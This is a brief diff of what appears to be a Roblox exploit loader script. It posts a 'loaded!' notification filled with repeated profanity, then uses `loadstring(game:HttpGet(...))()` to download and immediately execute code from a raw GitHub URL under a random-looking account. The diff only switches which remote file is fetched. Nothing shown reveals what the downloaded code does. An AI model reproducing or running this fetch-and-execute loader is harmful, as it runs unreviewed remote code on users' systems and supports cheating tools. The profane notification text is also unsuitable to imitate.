@@ -4,4 +4,4 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 Title = "loaded!",  	
 Text = "made by someone fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck ",
 })
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bhkxdcjkhgfdjiuhgjihgfhjkh/a/main/a"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bhkxdcjkhgfdjiuhgjihgfhjkh/a/main/c"))()
